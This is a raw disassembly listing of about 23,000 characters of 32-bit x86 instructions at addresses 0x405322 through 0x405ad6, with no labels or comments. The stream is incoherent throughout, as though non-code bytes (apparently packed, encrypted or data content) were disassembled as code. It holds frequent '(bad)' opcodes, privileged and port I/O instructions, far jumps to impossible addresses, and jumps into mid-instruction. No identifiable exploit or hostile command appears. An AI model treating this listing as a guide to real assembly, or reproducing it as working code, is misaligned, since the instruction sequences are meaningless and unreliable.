  405322:	ins    BYTE PTR es:[edi],dx
  405323:	jp     0x405398
  405325:	add    BYTE PTR [esi+ebp*8-0x1],bl
  405329:	mov    ebp,0x21f3a15b
  40532e:	xchg   esi,eax
  40532f:	fsub   QWORD PTR [ecx]
  405331:	stos   DWORD PTR es:[edi],eax
  405332:	data16 jae 0x405356
  405335:	adc    al,0x70
  405337:	mov    ds:0xd8cf030c,al
  40533c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40533d:	sub    BYTE PTR [edx+0x1e5c3336],ch
  405343:	and    bh,BYTE PTR [ebx]
  405345:	pushf  
  405346:	shr    al,1
  405348:	xchg   ebx,eax
  405349:	fbstp  TBYTE PTR [edi+0xa]
  40534c:	gs ss xchg esp,eax
  40534f:	dec    esp
  405350:	mov    dh,BYTE PTR [edx+0x713277c3]
  405356:	test   eax,0x2297f38b
  40535b:	es gs hlt 
  40535e:	xchg   BYTE PTR [ecx-0x6e],bh
  405361:	outs   dx,BYTE PTR ds:[esi]
  405362:	pop    eax
  405363:	aad    0xa7
  405365:	or     edi,esi
  405367:	dec    ebx
  405368:	fsubr  QWORD PTR [eax+0x5a8e35ee]
  40536e:	nop
  40536f:	jns    0x40534e
  405371:	js     0x40535a
  405373:	(bad)  
  405374:	or     al,BYTE PTR fs:[edi-0x7237fbcd]
  40537b:	pop    eax
  40537c:	sub    BYTE PTR [edi-0x71bf6db6],dh
  405382:	mulps  xmm4,XMMWORD PTR [ebx+0x21]
  405386:	mov    ch,0xf1
  405388:	pop    ebp
  405389:	loope  0x40537d
  40538b:	jnp    0x4053f9
  40538d:	xor    ecx,ecx
  40538f:	adc    eax,0x9ca2b3bd
  405394:	pop    eax
  405395:	(bad)  
  405396:	idiv   BYTE PTR [edi-0x2777e91a]
  40539c:	dec    ebp
  40539d:	and    eax,0xf1a1d688
  4053a2:	lahf   
  4053a3:	sbb    al,0xc1
  4053a5:	mov    ebp,0xe98248f8
  4053aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4053ab:	test   DWORD PTR [edx+esi*8+0x29],0x72b5cf0
  4053b3:	hlt    
  4053b4:	into   
  4053b5:	out    dx,eax
  4053b6:	dec    esp
  4053b7:	out    0x9c,al
  4053b9:	test   BYTE PTR [ebx],ah
  4053bb:	mov    bh,al
  4053bd:	dec    esi
  4053be:	cmp    dh,ch
  4053c0:	aas    
  4053c1:	dec    edi
  4053c2:	push   ds
  4053c3:	and    BYTE PTR es:[ecx-0x4a],dl
  4053c7:	popf   
  4053c8:	push   esi
  4053c9:	scas   al,BYTE PTR es:[edi]
  4053ca:	xor    al,0xea
  4053cc:	xor    DWORD PTR [edx-0x15],esp
  4053cf:	cmp    esp,ebx
  4053d1:	retf   
  4053d2:	dec    esp
  4053d3:	icebp  
  4053d4:	pop    eax
  4053d5:	dec    ebx
  4053d6:	pop    esi
  4053d7:	rcl    DWORD PTR [esi],cl
  4053d9:	scas   eax,DWORD PTR es:[edi]
  4053da:	adc    BYTE PTR [edi-0x62d2fb02],bh
  4053e0:	xor    al,0xb5
  4053e2:	mov    esi,DWORD PTR [ecx+0x63]
  4053e5:	fs jbe 0x4053e6
  4053e8:	inc    edx
  4053e9:	inc    ecx
  4053ea:	or     eax,0x47f8bf9b
  4053ef:	dec    esp
  4053f0:	xor    BYTE PTR [esi-0x27],cl
  4053f3:	add    DWORD PTR [esi+0x6ab0ddda],esi
  4053f9:	pop    esp
  4053fa:	es mov al,0x8
  4053fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4053fe:	pop    ss
  4053ff:	cmp    eax,0xbbeda92a
  405404:	hlt    
  405405:	xor    al,0x85
  405407:	rol    ecx,cl
  405409:	xor    edi,DWORD PTR [eax+edi*1+0x2]
  40540d:	and    BYTE PTR [esi*1+0x23726f14],bh
  405414:	dec    ebp
  405415:	dec    eax
  405416:	stos   BYTE PTR es:[edi],al
  405417:	push   ebp
  405418:	sti    
  405419:	cmc    
  40541a:	(bad)  
  40541b:	pop    edx
  40541c:	(bad)  
  40541d:	mov    ecx,0x8d1a2c09
  405422:	(bad)  
  405424:	imul   DWORD PTR ds:0x11e2fc61
  40542a:	push   DWORD PTR [ecx-0x2993f79f]
  405430:	xchg   ebx,eax
  405431:	out    0x28,al
  405433:	shl    BYTE PTR [ecx+eiz*1-0x72],0x80
  405438:	jg     0x405429
  40543a:	push   esp
  40543b:	shr    DWORD PTR [ebp+0x4c2b6c97],cl
  405441:	dec    edx
  405442:	scas   eax,DWORD PTR es:[edi]
  405443:	mov    ebx,0x775c9d93
  405448:	mov    fs,WORD PTR [ecx+0x48]
  40544b:	inc    ecx
  40544c:	mov    ebp,0xb3b3356c
  405451:	mov    dh,0x7b
  405453:	pop    es
  405454:	fs in  al,dx
  405456:	imul   DWORD PTR [esi+0x70ef8dea]
  40545c:	mov    WORD PTR [ecx-0x14256eb9],gs
  405462:	int3   
  405463:	jmp    0x405460
  405465:	mov    BYTE PTR [ebx+0x50eb5c32],cl
  40546b:	bound  edi,QWORD PTR [edx+0x2976d73c]
  405471:	ficom  WORD PTR [edi-0x146637e1]
  405477:	lods   eax,DWORD PTR ds:[esi]
  405478:	imul   ebx,DWORD PTR [eax],0x40973228
  40547e:	or     al,0x7b
  405480:	sbb    DWORD PTR [eax-0x6b4ccfd2],esi
  405486:	adc    edx,DWORD PTR [edi+0x4f]
  405489:	push   0x992fe38e
  40548e:	or     ebp,edi
  405490:	ja     0x405472
  405492:	ja     0x405430
  405494:	mov    ebp,0x4e51792f
  405499:	out    dx,al
  40549a:	in     al,dx
  40549b:	mul    BYTE PTR [ebp-0x4f]
  40549e:	stc    
  40549f:	xlat   BYTE PTR ds:[ebx]
  4054a0:	add    DWORD PTR [ebx+0x7a],ebx
  4054a3:	shl    BYTE PTR [edx+0x1eafd75b],1
  4054a9:	sbb    eax,DWORD PTR [ecx+ebp*4-0x49be896]
  4054b0:	jae    0x4054f5
  4054b2:	call   0x7524218d
  4054b7:	jg     0x405469
  4054b9:	inc    ebx
  4054ba:	fwait
  4054bb:	cmp    al,0x35
  4054bd:	push   edx
  4054be:	pop    eax
  4054bf:	xchg   ebp,eax
  4054c0:	(bad)  
  4054c1:	(bad)  
  4054c2:	sbb    al,0x6
  4054c4:	nop
  4054c5:	cmp    BYTE PTR [edx-0x61],cl
  4054c8:	inc    ebx
  4054c9:	adc    DWORD PTR [ebx-0x45],esp
  4054cc:	mov    ebx,0x33f89e48
  4054d1:	jl     0x40551f
  4054d3:	jp     0x4054cf
  4054d5:	cmp    BYTE PTR [edx],0xc8
  4054d8:	in     eax,dx
  4054d9:	jmp    0x48f1:0x74bc339a
  4054e0:	div    DWORD PTR [ebx-0x38]
  4054e3:	or     BYTE PTR [ebx],ch
  4054e5:	mov    dl,0x17
  4054e7:	loope  0x405562
  4054e9:	ins    BYTE PTR es:[edi],dx
  4054ea:	aas    
  4054eb:	or     bl,al
  4054ed:	jne    0x4054d5
  4054ef:	mov    ebx,0x3701a55c
  4054f4:	jecxz  0x4054d4
  4054f6:	xchg   DWORD PTR [edi+0x1a],esp
  4054f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4054fa:	push   esi
  4054fb:	jae    0x4054bc
  4054fd:	loop   0x40555f
  4054ff:	ja     0x405502
  405501:	xchg   esi,eax
  405502:	inc    ebp
  405503:	jmp    0x2cba:0x56a4eb12
  40550a:	xor    BYTE PTR [ecx+0x54],cl
  40550d:	out    dx,eax
  40550e:	adc    bl,ah
  405510:	dec    ecx
  405511:	ss icebp 
  405513:	xlat   BYTE PTR ds:[ebx]
  405514:	push   ebp
  405515:	popf   
  405516:	jae    0x40556b
  405518:	scas   eax,DWORD PTR es:[edi]
  405519:	pop    edi
  40551a:	cdq    
  40551b:	and    DWORD PTR [ebp-0x1a24d877],edi
  405521:	fist   DWORD PTR [ebx+0x7f09c0e7]
  405527:	push   0xffffffe4
  405529:	push   edi
  40552a:	push   0x8b8808a6
  40552f:	dec    edx
  405530:	push   ebx
  405531:	das    
  405532:	and    al,0xd
  405534:	scas   eax,DWORD PTR es:[edi]
  405535:	(bad)  
  405536:	(bad)  
  405537:	bound  esp,QWORD PTR [edi-0x4b8613d7]
  40553d:	adc    ch,BYTE PTR [ebx]
  40553f:	mov    cs,WORD PTR [esi+0xb]
  405542:	and    eax,0xfa0e7920
  405547:	outs   dx,DWORD PTR fs:[esi]
  405549:	mov    edi,0xb9adc443
  40554e:	and    al,0x6
  405550:	ins    DWORD PTR es:[edi],dx
  405551:	dec    ebp
  405552:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405553:	int    0xbc
  405555:	adc    eax,0x91cb5ce4
  40555a:	lods   eax,DWORD PTR ds:[esi]
  40555b:	ret    
  40555c:	adc    DWORD PTR [eax-0x7879502b],0xbb020ea8
  405566:	xor    al,0xfd
  405568:	push   es
  405569:	outs   dx,BYTE PTR ds:[esi]
  40556a:	adc    DWORD PTR [ebx+0x769ec349],esp
  405570:	mov    dh,BYTE PTR [edi+0x340cb3d5]
  405576:	in     al,0xe4
  405578:	mov    bh,0x46
  40557a:	inc    edi
  40557b:	dec    esp
  40557c:	(bad)  
  40557e:	lods   al,BYTE PTR ds:[esi]
  40557f:	outs   dx,DWORD PTR ds:[esi]
  405580:	inc    eax
  405581:	mov    ch,0x5a
  405583:	and    al,0xa3
  405585:	pop    edi
  405586:	xor    ch,ch
  405588:	or     al,0xb3
  40558a:	inc    esi
  40558b:	pop    esi
  40558c:	(bad)  
  40558d:	dec    ebp
  40558e:	push   edi
  40558f:	sub    al,0xb5
  405591:	inc    DWORD PTR [ebp+0x2aa072dc]
  405597:	cmp    al,0x45
  405599:	lds    eax,FWORD PTR [esi+eiz*4-0x33958fe9]
  4055a0:	imul   esi,DWORD PTR [ebx],0xb3c65c63
  4055a6:	mov    ebx,0xf490be26
  4055ab:	and    eax,0x868a79bc
  4055b0:	pop    ebp
  4055b1:	rcr    BYTE PTR [ebp+ebx*2+0x5e4fc72d],cl
  4055b8:	out    dx,eax
  4055b9:	xlat   BYTE PTR ds:[ebx]
  4055ba:	dec    ebx
  4055bb:	test   DWORD PTR [edi+0x409b6e8c],edx
  4055c1:	rol    DWORD PTR es:[esi],1
  4055c4:	sbb    edx,ecx
  4055c6:	call   0xa1a70d37
  4055cb:	pop    esi
  4055cc:	sub    bh,al
  4055ce:	fld    TBYTE PTR [edi+0x2c]
  4055d1:	das    
  4055d2:	jo     0x405572
  4055d4:	mov    bh,0x6e
  4055d6:	cdq    
  4055d7:	pusha  
  4055d8:	nop
  4055d9:	es mov bl,0x9d
  4055dc:	jnp    0x405636
  4055de:	mov    esi,0x5a2ff72
  4055e3:	and    eax,0x191c923a
  4055e8:	xor    BYTE PTR [ecx],0xaa
  4055eb:	mov    ah,0x5f
  4055ed:	and    DWORD PTR [edx],ecx
  4055ef:	xor    esi,DWORD PTR [eax-0x39]
  4055f2:	jb     0x4055da
  4055f4:	repz pushf 
  4055f6:	pop    es
  4055f7:	fidivr DWORD PTR [edi+edi*1-0x32]
  4055fb:	xchg   BYTE PTR [esi],bh
  4055fd:	add    dl,BYTE PTR [ebx-0x2ebb2296]
  405603:	mov    ebp,DWORD PTR [ebx-0x12]
  405606:	clc    
  405607:	mul    BYTE PTR ds:0x3ecaecaf
  40560d:	mov    ch,BYTE PTR [ebp+0x2b]
  405610:	inc    ebx
  405611:	and    eax,0xfb235eba
  405616:	hlt    
  405617:	xchg   BYTE PTR [edi+0x2d770320],cl
  40561d:	(bad)  
  40561f:	mov    ecx,0x6e685aff
  405624:	and    al,0xa4
  405626:	jmp    0xc0137724
  40562b:	xor    al,0xd4
  40562d:	or     al,0x93
  40562f:	mov    edx,0xd6966c6b
  405634:	mov    edx,DWORD PTR [esi+0x2a99fdec]
  40563a:	jecxz  0x4055bc
  40563c:	inc    edi
  40563d:	jno    0x40561f
  40563f:	pop    ebp
  405640:	mov    ecx,esi
  405642:	mov    ebp,0x51348c35
  405647:	and    cl,BYTE PTR [esi]
  405649:	clc    
  40564a:	cmp    BYTE PTR [eax],cl
  40564c:	lods   eax,DWORD PTR ds:[esi]
  40564d:	icebp  
  40564e:	pusha  
  40564f:	jnp    0x405667
  405651:	fld    st(4)
  405653:	mov    eax,ds:0xc713c02f
  405658:	loopne 0x405615
  40565a:	mov    dh,0x5
  40565c:	mov    bl,0x8d
  40565e:	inc    eax
  40565f:	std    
  405660:	ins    DWORD PTR es:[edi],dx
  405661:	popa   
  405662:	jp     0x40565b
  405664:	retf   
  405665:	dec    ecx
  405666:	ja     0x4056d1
  405668:	jmp    0xe60e35b9
  40566d:	call   0xd1a5aa81
  405672:	cmovle esp,esp
  405675:	inc    ebp
  405676:	add    DWORD PTR [ecx],esp
  405678:	ret    
  405679:	sub    BYTE PTR [eax+ebx*1+0x77e32bbd],ah
  405680:	jecxz  0x4056b2
  405682:	rcl    DWORD PTR [eax-0x7ec0f82b],0xba
  405689:	mov    ebp,0x7872f67
  40568e:	jmp    FWORD PTR [edx]
  405690:	leave  
  405691:	pushfw 
  405693:	jmp    0x6e309209
  405698:	data16 add al,0xc
  40569b:	mov    dh,0xd4
  40569d:	daa    
  40569e:	sub    DWORD PTR [ebp-0x7d89ecc],edi
  4056a4:	fld    DWORD PTR [ebp+0x30a491fc]
  4056aa:	popa   
  4056ab:	inc    edi
  4056ac:	jae    0x40568b
  4056ae:	push   ebp
  4056af:	mov    bh,0x69
  4056b1:	ja     0x405700
  4056b3:	xor    al,0xa9
  4056b5:	call   0x7799:0x5e5b6da
  4056bc:	add    ebp,edx
  4056be:	jge    0x405721
  4056c0:	mov    dl,0x2
  4056c2:	call   0xcb485e30
  4056c7:	jbe    0x40570b
  4056c9:	add    DWORD PTR [ebx+0x7500613a],ecx
  4056cf:	loop   0x405658
  4056d1:	sub    al,BYTE PTR [edi+0x78c0eec]
  4056d7:	stos   BYTE PTR es:[edi],al
  4056d8:	add    eax,0x94665ddb
  4056dd:	jl     0x405699
  4056df:	addr16 loopne 0x405681
  4056e2:	mov    ah,0x51
  4056e4:	mov    bh,0xbd
  4056e6:	fistp  WORD PTR [edx]
  4056e8:	enter  0x69f2,0xaa
  4056ec:	(bad)  
  4056ed:	push   ebx
  4056ee:	test   al,0x8c
  4056f0:	sahf   
  4056f1:	cmp    eax,0x6aa98227
  4056f6:	jns    0x4056c8
  4056f8:	(bad)  
  4056f9:	push   0xec4c5d06
  4056fe:	sbb    dl,BYTE PTR [ebp-0x431c5545]
  405704:	retf   
  405705:	pop    ss
  405706:	pop    esp
  405707:	out    0xde,al
  405709:	cmp    DWORD PTR [ecx+0x6a7ead73],ebx
  40570f:	and    ecx,esi
  405711:	in     eax,0xa
  405713:	mov    bl,0xe4
  405715:	mov    ch,0x42
  405717:	mov    al,ds:0xd95f8e91
  40571c:	adc    eax,0x90972089
  405721:	inc    eax
  405722:	mov    edi,0xbd31590
  405727:	xlat   BYTE PTR ds:[ebx]
  405728:	mov    ds:0x5d38206d,al
  40572d:	rcr    DWORD PTR [ebx+0x653fa936],0xa2
  405734:	and    BYTE PTR [edi-0x5b],al
  405737:	test   eax,0x641c276c
  40573c:	stc    
  40573d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40573e:	adc    dl,ch
  405740:	xchg   ebx,eax
  405741:	xor    BYTE PTR [esp+esi*8],bl
  405744:	sub    eax,0x6d4c097d
  405749:	shl    al,1
  40574b:	scas   al,BYTE PTR es:[edi]
  40574c:	xchg   ebp,eax
  40574d:	push   0x39568fa0
  405752:	inc    edi
  405753:	mov    cl,0xc3
  405755:	xchg   edi,eax
  405756:	repz dec edi
  405758:	and    dh,BYTE PTR [esp+edi*8-0x4fe32b91]
  40575f:	iret   
  405760:	int3   
  405761:	xchg   ebx,eax
  405762:	ficom  WORD PTR [edx]
  405764:	and    al,0xce
  405766:	push   ecx
  405767:	outs   dx,BYTE PTR ds:[esi]
  405768:	inc    eax
  405769:	xor    BYTE PTR [ecx-0x22b26d3a],bh
  40576f:	inc    ebx
  405770:	sar    cl,0x7d
  405773:	sbb    al,0xb
  405775:	or     ecx,DWORD PTR [ecx+0x2d]
  405778:	cmp    edi,DWORD PTR [ebx-0x7c]
  40577b:	pop    esp
  40577c:	inc    ebp
  40577d:	pop    edx
  40577e:	in     al,0x3d
  405780:	and    DWORD PTR [edi-0x38],ebx
  405783:	test   eax,0x906420fd
  405788:	xlat   BYTE PTR ds:[ebx]
  405789:	or     ch,BYTE PTR [eax]
  40578b:	and    al,0x71
  40578d:	or     BYTE PTR [ebx],ah
  40578f:	push   edi
  405790:	loopne 0x40575f
  405792:	inc    ebx
  405793:	fs mov edi,0x797c1f1e
  405799:	ins    DWORD PTR es:[edi],dx
  40579a:	jae    0x4057aa
  40579c:	and    al,0xe4
  40579e:	xor    edi,0xffffffba
  4057a1:	aad    0x1d
  4057a3:	ror    BYTE PTR [edx+0xb34f604],cl
  4057a9:	mov    bh,0xcd
  4057ab:	mov    ch,0x52
  4057ad:	loope  0x40579c
  4057af:	into   
  4057b0:	xor    al,BYTE PTR [edi-0x3f]
  4057b3:	xchg   edx,eax
  4057b4:	xchg   dl,ch
  4057b6:	add    eax,0x6c20d36e
  4057bb:	mov    edi,0x4b7ae78a
  4057c0:	cmp    al,0x52
  4057c2:	pusha  
  4057c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4057c4:	push   eax
  4057c5:	cs xor al,0x1a
  4057c8:	cmp    al,0x5
  4057ca:	mov    edx,0xba80e13f
  4057cf:	push   ebx
  4057d0:	outs   dx,BYTE PTR ds:[esi]
  4057d1:	outs   dx,BYTE PTR ds:[esi]
  4057d2:	jp     0x4057dc
  4057d4:	pop    esp
  4057d5:	in     eax,0xd4
  4057d7:	test   al,0x6b
  4057d9:	and    ebx,DWORD PTR [esi+0x27ba2db5]
  4057df:	xchg   DWORD PTR [esi-0x5d],esp
  4057e2:	aaa    
  4057e3:	push   esp
  4057e4:	ins    DWORD PTR es:[edi],dx
  4057e5:	sub    BYTE PTR ds:0x7b72d78e,ah
  4057eb:	or     esi,DWORD PTR [ebp+0x2bea8954]
  4057f1:	xchg   ecx,esi
  4057f3:	cmc    
  4057f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4057f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4057f6:	add    DWORD PTR [ebx-0x1866d3d2],edx
  4057fc:	lahf   
  4057fd:	test   al,0xa1
  4057ff:	into   
  405800:	dec    edx
  405801:	xchg   edi,eax
  405802:	fucom  st(3)
  405804:	pop    ds
  405805:	push   cs
  405806:	cs push es
  405808:	in     eax,dx
  405809:	in     eax,0x83
  40580b:	push   ecx
  40580c:	xchg   ebx,eax
  40580d:	adc    ch,bl
  40580f:	retf   0x6074
  405812:	aaa    
  405813:	hlt    
  405814:	sbb    BYTE PTR [ebx+0x7657848d],0x66
  40581b:	cld    
  40581c:	and    esp,ebx
  40581e:	adc    eax,0xc35759cb
  405823:	mov    esp,DWORD PTR ds:0xd09d9fbe
  405829:	sbb    al,0x6c
  40582b:	std    
  40582c:	iret   
  40582d:	add    al,0x72
  40582f:	out    0xe0,al
  405831:	sbb    DWORD PTR [edx],ecx
  405833:	jmp    0x35d:0x66179f89
  40583a:	push   0x6e
  40583c:	test   DWORD PTR [ebx+0x8],edi
  40583f:	test   eax,0xeb610503
  405844:	jl     0x405855
  405846:	jno    0x4058a0
  405848:	pop    esi
  405849:	mov    dl,0xc3
  40584b:	lds    esi,FWORD PTR [eax+0x59]
  40584e:	in     al,0x13
  405850:	sbb    ebx,0xffffffb9
  405853:	push   0x4b
  405855:	mov    dh,0x6c
  405857:	pop    esi
  405858:	mov    dh,0x62
  40585a:	popf   
  40585b:	lock call 0xad577b83
  405861:	pop    ds
  405862:	push   ecx
  405863:	sar    DWORD PTR [eax+edi*2-0x1a],cl
  405867:	or     DWORD PTR [ebx+0x72],0x6b6a4929
  40586e:	cmp    DWORD PTR [ebx],ebx
  405870:	(bad)  
  405871:	and    al,0xac
  405873:	std    
  405874:	inc    eax
  405875:	in     eax,dx
  405876:	mov    DWORD PTR [edx],ebp
  405878:	cmp    eax,DWORD PTR [ebp+0x639be2e3]
  40587e:	clc    
  40587f:	add    DWORD PTR [ebp-0x1c8bcfdb],0x7e5542ab
  405889:	imul   ebx,DWORD PTR [edi+0x40],0xffffffd9
  40588d:	mov    ebp,0x5dea85fe
  405892:	pop    esi
  405893:	ret    
  405894:	mov    eax,0x287b8a48
  405899:	repz mov bl,0x2a
  40589c:	jo     0x4058a4
  40589e:	arpl   WORD PTR [eax+0x3d007b16],bx
  4058a4:	iret   
  4058a5:	test   BYTE PTR [ecx+0x3e998257],bh
  4058ab:	or     ebp,DWORD PTR [edi]
  4058ad:	dec    esi
  4058ae:	push   ds
  4058af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4058b0:	lods   al,BYTE PTR ds:[esi]
  4058b1:	es aaa 
  4058b3:	lods   eax,DWORD PTR ds:[esi]
  4058b4:	sub    al,BYTE PTR [eax+ecx*8+0x7a673353]
  4058bb:	jmp    0xae62:0x268c49eb
  4058c2:	lods   al,BYTE PTR ds:[esi]
  4058c3:	into   
  4058c4:	mov    ds:0x81ea6339,eax
  4058c9:	jbe    0x4058db
  4058cb:	cmp    bl,dh
  4058cd:	push   edx
  4058ce:	cmp    ebp,DWORD PTR [edx]
  4058d0:	inc    eax
  4058d1:	cmp    BYTE PTR [esi+0x770c79c9],ch
  4058d7:	retf   
  4058d8:	jb     0x4058db
  4058da:	inc    esp
  4058db:	mov    ?,WORD PTR [ebp+0x69]
  4058de:	lds    esi,FWORD PTR [edi]
  4058e0:	sahf   
  4058e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4058e2:	iret   
  4058e3:	fild   WORD PTR [edx+ebx*4+0x1c729b6f]
  4058ea:	loop   0x405931
  4058ec:	loopne 0x405877
  4058ee:	push   es
  4058ef:	push   edx
  4058f0:	xchg   ebx,eax
  4058f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4058f2:	aas    
  4058f3:	dec    ebx
  4058f4:	scas   eax,DWORD PTR es:[edi]
  4058f5:	mov    edx,0x2d1b80f7
  4058fa:	scas   eax,DWORD PTR es:[edi]
  4058fb:	popa   
  4058fc:	dec    edi
  4058fd:	fiadd  WORD PTR [ebx+0x1e]
  405900:	xor    al,0xb4
  405902:	in     eax,0x0
  405904:	aam    0xe5
  405906:	xlat   BYTE PTR ds:[ebx]
  405907:	nop
  405908:	mov    dh,0xa2
  40590a:	sbb    al,0xe3
  40590c:	out    dx,eax
  40590d:	pop    edi
  40590e:	dec    eax
  40590f:	cwde   
  405910:	ret    
  405911:	ja     0x405975
  405913:	int3   
  405914:	lods   eax,DWORD PTR ds:[esi]
  405915:	(bad)  
  405916:	mov    ebx,0x12eebecb
  40591b:	sub    BYTE PTR [ebp+0x3a],bl
  40591e:	pop    ebp
  40591f:	xor    ecx,DWORD PTR [edx+0x8eb344]
  405925:	or     ebx,0x57389642
  40592b:	jae    0x4058db
  40592d:	scas   al,BYTE PTR es:[edi]
  40592e:	jbe    0x40591a
  405930:	outs   dx,DWORD PTR ds:[esi]
  405931:	hlt    
  405932:	cmp    al,0x5
  405934:	xchg   DWORD PTR [ebp+0x6f],eax
  405937:	(bad)  
  405938:	mov    al,ds:0x3a7dcdb9
  40593d:	pop    esp
  40593e:	jne    0x4059a0
  405940:	add    eax,0x83bc8ca6
  405945:	push   ss
  405946:	mov    esi,0x4dacc53c
  40594b:	jnp    0x4059a7
  40594d:	adc    eax,0x273ff349
  405952:	sub    al,0xa
  405954:	sbb    DWORD PTR [ebx+0x29251ce2],ebp
  40595a:	adc    DWORD PTR [edx],0x6fb33f7b
  405960:	inc    edx
  405961:	adc    al,0xba
  405963:	jo     0x405982
  405965:	(bad)  
  405966:	fs mov eax,0x8a900b49
  40596c:	popf   
  40596d:	bound  esp,QWORD PTR [edi+ebp*4]
  405970:	pop    ss
  405971:	ins    DWORD PTR es:[edi],dx
  405972:	fwait
  405973:	popf   
  405974:	mov    WORD PTR [edx],es
  405976:	push   edi
  405977:	(bad)  
  405978:	fist   DWORD PTR [ebx*8-0x6c2a5e3c]
  40597f:	shl    ah,cl
  405981:	dec    edi
  405982:	jne    0x405979
  405984:	ins    DWORD PTR es:[edi],dx
  405985:	xchg   ebp,eax
  405986:	cmp    al,BYTE PTR cs:[eax]
  405989:	mov    ebp,eax
  40598b:	cmc    
  40598c:	fsubr  st(0),st
  40598e:	add    bl,BYTE PTR [ecx+0x4b]
  405991:	mov    dh,0x24
  405993:	inc    ebp
  405994:	pop    ds
  405995:	cwde   
  405996:	push   esi
  405997:	adc    edi,DWORD PTR [esp+edx*8+0x5391974]
  40599e:	ja     0x4059ac
  4059a0:	xlat   BYTE PTR ds:[ebx]
  4059a1:	fnstenv [ecx+0x1a5dfcf5]
  4059a7:	(bad)  
  4059a9:	or     DWORD PTR [edx],edx
  4059ab:	mov    ebp,0x298d8b67
  4059b0:	fimul  WORD PTR [eax-0x2dde29f7]
  4059b6:	in     al,dx
  4059b7:	xchg   BYTE PTR [edx],ah
  4059b9:	lods   eax,DWORD PTR ds:[esi]
  4059ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4059bb:	mov    ds:0xd4364d0d,al
  4059c0:	lods   eax,DWORD PTR ds:[esi]
  4059c1:	jp     0x4059d3
  4059c3:	lahf   
  4059c4:	adc    bl,dl
  4059c6:	imul   ecx,DWORD PTR [ebp+0x48],0x3e0a882f
  4059cd:	push   esi
  4059ce:	cmp    eax,0xacbb8131
  4059d3:	lea    esi,[ecx+0x205e8405]
  4059d9:	scas   al,BYTE PTR es:[edi]
  4059da:	ins    DWORD PTR es:[edi],dx
  4059db:	adc    DWORD PTR [eax],eax
  4059dd:	jge    0x4059ef
  4059df:	pop    esi
  4059e0:	jp     0x405964
  4059e2:	jo     0x405a40
  4059e4:	cli    
  4059e5:	sbb    al,cl
  4059e7:	(bad)  
  4059e8:	repz push es
  4059ea:	js     0x40597f
  4059ec:	mov    ebp,0x8ab17c88
  4059f1:	sbb    DWORD PTR [ebx+0x4a46cea3],ebp
  4059f7:	inc    esp
  4059f8:	push   es
  4059f9:	addr16 iret 
  4059fb:	aam    0x58
  4059fd:	xlat   BYTE PTR ds:[ebx]
  4059fe:	push   esi
  4059ff:	xlat   BYTE PTR ds:[ebx]
  405a00:	psllw  mm6,mm2
  405a03:	stc    
  405a04:	(bad)  
  405a05:	or     bh,BYTE PTR [ecx]
  405a07:	(bad)  
  405a08:	jmp    0xab4b:0x66e5bdf
  405a0f:	(bad)  
  405a10:	sub    dh,BYTE PTR fs:[eax-0x68]
  405a14:	lahf   
  405a15:	jne    0x4059be
  405a17:	or     dh,BYTE PTR [ecx+0x5c]
  405a1a:	jbe    0x405a3d
  405a1c:	mov    eax,ds:0x767de31f
  405a21:	jb     0x4059dd
  405a23:	(bad)
  405a27:	inc    eax
  405a28:	dec    esi
  405a29:	add    eax,0x8151474f
  405a2e:	pop    esi
  405a2f:	jnp    0x405a73
  405a31:	mov    ds,WORD PTR [esi+0x54da3850]
  405a37:	pop    ecx
  405a38:	or     edi,esp
  405a3a:	(bad)  
  405a3b:	adc    DWORD PTR [ebx-0x58],ebx
  405a3e:	mov    WORD PTR [edx+0x3e7c9fb5],cs
  405a44:	or     al,0x5d
  405a46:	mov    bl,0x4f
  405a48:	pusha  
  405a49:	sub    eax,0xa89d9a24
  405a4e:	bound  eax,QWORD PTR [bp+di]
  405a51:	out    dx,eax
  405a52:	nop
  405a53:	sbb    ebp,ebx
  405a55:	outs   dx,BYTE PTR ds:[esi]
  405a56:	test   eax,0x9f9432f8
  405a5b:	dec    eax
  405a5c:	pusha  
  405a5d:	cmp    esp,esi
  405a5f:	(bad)  
  405a60:	fstp   st(4)
  405a62:	push   eax
  405a63:	jns    0x405a8c
  405a65:	and    esi,0x13
  405a68:	pop    ss
  405a69:	iret   
  405a6a:	and    DWORD PTR [ebx+esi*8],ebx
  405a6d:	xchg   ecx,eax
  405a6e:	cdq    
  405a6f:	push   0x339500bf
  405a74:	xchg   esp,edx
  405a76:	xchg   ebx,eax
  405a77:	inc    esp
  405a78:	inc    esi
  405a79:	pop    ecx
  405a7a:	and    ah,BYTE PTR [ebx+0x48e12863]
  405a80:	jnp    0x405a6f
  405a82:	mov    ecx,0xa90964f8
  405a87:	adc    eax,0x9c08cde8
  405a8c:	mov    BYTE PTR [ebx+ebx*2-0x4664d303],bl
  405a93:	jge    0x405a32
  405a95:	in     eax,0x47
  405a97:	icebp  
  405a98:	test   DWORD PTR [esi-0x34],0x61c8b69b
  405a9f:	pop    ebp
  405aa0:	daa    
  405aa1:	fidiv  WORD PTR [edi]
  405aa3:	les    edx,FWORD PTR [ebx]
  405aa5:	lods   al,BYTE PTR ds:[esi]
  405aa6:	mov    al,0x80
  405aa8:	lahf   
  405aa9:	pop    edx
  405aaa:	and    ah,BYTE PTR [edi+0x2c90d29e]
  405ab0:	mov    ebx,0x6da18512
  405ab5:	fptan  
  405ab7:	sbb    al,0x89
  405ab9:	leave  
  405aba:	xchg   esi,eax
  405abb:	in     al,dx
  405abc:	rol    dl,0x16
  405abf:	fdiv   DWORD PTR es:[esi-0x51e0b654]
  405ac6:	lea    ebp,[ebx+0x6]
  405ac9:	mov    WORD PTR [ecx+0x6],ds
  405acc:	(bad)  
  405acd:	neg    esp
  405acf:	iret   
  405ad0:	xchg   edx,eax
  405ad1:	jge    0x405a70
  405ad3:	jbe    0x405ad7
  405ad5:	cli    
  405ad6:	call   0xb675:0x90641fbc
